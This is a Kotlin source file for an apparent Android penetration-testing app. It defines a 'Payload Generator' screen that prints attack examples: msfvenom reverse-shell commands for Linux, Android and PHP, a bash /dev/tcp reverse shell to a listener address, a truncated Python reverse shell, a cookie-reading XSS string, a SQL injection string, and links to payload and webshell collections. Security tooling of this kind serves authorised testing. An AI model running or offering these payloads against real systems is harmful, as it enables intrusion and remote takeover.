package com.android.pen15.ui.crypto

import android.os.Bundle
import androidx.lifecycle.lifecycleScope
import com.android.pen15.R
import com.android.pen15.ui.base.BaseToolActivity
import com.android.pen15.utils.ToolChecker
import kotlinx.coroutines.launch

class PayloadGeneratorActivity : BaseToolActivity() {

    private var msfvenomAvailable = false

    // Online payload resources
    private val payloadResources = mapOf(
        "PayloadAllTheThings" to "https://github.com/swisskyrepo/PayloadsAllTheThings",
        "RevShells" to "https://www.revshells.com/",
        "XSS Payloads" to "https://github.com/payloadbox/xss-payload-list",
        "SQLi Payloads" to "https://github.com/payloadbox/sql-injection-payload-list",
        "WebShells" to "https://github.com/tennc/webshell"
    )

    override fun getToolName() = "Payload Generator"
    override fun getLayoutResource() = R.layout.activity_generic_tool
    override fun onToolExecute() { generatePayload() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        logMessage("Payload Generator", includeTimestamp = false)
        logMessage("Generate reverse shells, exploits & payloads", includeTimestamp = false)
        logMessage("")

        // Check msfvenom availability
        lifecycleScope.launch {
            msfvenomAvailable = ToolChecker.checkToolAvailable(this@PayloadGeneratorActivity, "msfvenom")

            if (!msfvenomAvailable) {
                logMessage("⚠️ msfvenom not installed", includeTimestamp = false)
                logMessage("")
                logMessage("Install Metasploit:", includeTimestamp = false)
                logMessage("pkg install metasploit", includeTimestamp = false)
                logMessage("(Warning: Large download ~500MB)", includeTimestamp = false)
                logMessage("")
                logMessage("Alternative: Use online generators below", includeTimestamp = false)
            } else {
                logMessage("✓ msfvenom is available", includeTimestamp = false)
                logMessage("")
                logMessage("Click Execute for example payloads", includeTimestamp = false)
            }

            logMessage("")
            logMessage("--- Online Payload Resources ---", includeTimestamp = false)
            payloadResources.forEach { (name, url) ->
                logMessage("• $name", includeTimestamp = false)
                logMessage("  $url", includeTimestamp = false)
            }
        }
    }

    private fun generatePayload() {
        clearOutput()
        logMessage("Payload Generator")
        logMessage("")

        if (msfvenomAvailable) {
            logMessage("Generating example reverse shell payloads...")
            logMessage("")
            logMessage("--- Linux Reverse Shell ---")
            logMessage("msfvenom -p linux/x64/shell_reverse_tcp \\", includeTimestamp = false)
            logMessage("  LHOST=192.168.1.100 LPORT=4444 \\", includeTimestamp = false)
            logMessage("  -f elf > shell.elf", includeTimestamp = false)
            logMessage("")

            logMessage("--- Android APK Payload ---")
            logMessage("msfvenom -p android/meterpreter/reverse_tcp \\", includeTimestamp = false)
            logMessage("  LHOST=192.168.1.100 LPORT=4444 \\", includeTimestamp = false)
            logMessage("  -o payload.apk", includeTimestamp = false)
            logMessage("")

            logMessage("--- PHP Web Shell ---")
            logMessage("msfvenom -p php/reverse_php \\", includeTimestamp = false)
            logMessage("  LHOST=192.168.1.100 LPORT=4444 \\", includeTimestamp = false)
            logMessage("  -f raw > shell.php", includeTimestamp = false)
            logMessage("")
        }

        logMessage("--- Common Payloads ---")
        logMessage("")

        logMessage("Bash Reverse Shell:", includeTimestamp = false)
        logMessage("bash -i >& /dev/tcp/192.168.1.100/4444 0>&1", includeTimestamp = false)
        logMessage("")

        logMessage("Python Reverse Shell:", includeTimestamp = false)
        logMessage("python -c 'import socket,subprocess,os;...'", includeTimestamp = false)
        logMessage("")

        logMessage("XSS Payload:", includeTimestamp = false)
        logMessage("<script>alert(document.cookie)</script>", includeTimestamp = false)
        logMessage("")

        logMessage("SQL Injection:", includeTimestamp = false)
        logMessage("' OR '1'='1' --", includeTimestamp = false)
        logMessage("")

        logMessage("--- Online Generators ---", includeTimestamp = false)
        logMessage("")
        logMessage("RevShells (Interactive):", includeTimestamp = false)
        logMessage("${payloadResources["RevShells"]}", includeTimestamp = false)
        logMessage("")
        logMessage("PayloadAllTheThings:", includeTimestamp = false)
        logMessage("${payloadResources["PayloadAllTheThings"]}", includeTimestamp = false)
        logMessage("")
        logMessage("⚠️ Replace IPs/Ports with your values", includeTimestamp = false)
    }
}
